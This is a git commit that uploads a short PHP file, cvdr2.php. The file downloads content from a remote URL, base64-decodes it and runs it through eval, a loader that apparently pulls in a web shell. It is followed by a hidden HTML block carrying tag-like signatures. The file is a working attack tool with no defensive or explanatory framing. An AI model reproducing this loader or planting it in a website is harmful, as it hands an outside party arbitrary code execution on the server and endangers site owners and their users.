7495fee5e0f6335a8dea297a47468ca4b2beb4cb
cavdar59 <41127292+cavdar59@users.noreply.github.com>
2018-07-30 03:14:31 +0300

    Add files via upload

---
+++ cvdr2.php
@@ -0,0 +1,14 @@
+<?php
+/*
+RedHatZ
+*/
+$r3d = "https://cavdar59.github.io/alfa";
+$l3nin = file_get_contents($r3d); 
+eval("?>".(base64_decode($l3nin)));
+?>
+<!DOCTYPE html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<div style="display: none;">
+<h1>AllFa</h1>
+</html>
+<!-- B0RU70 -->
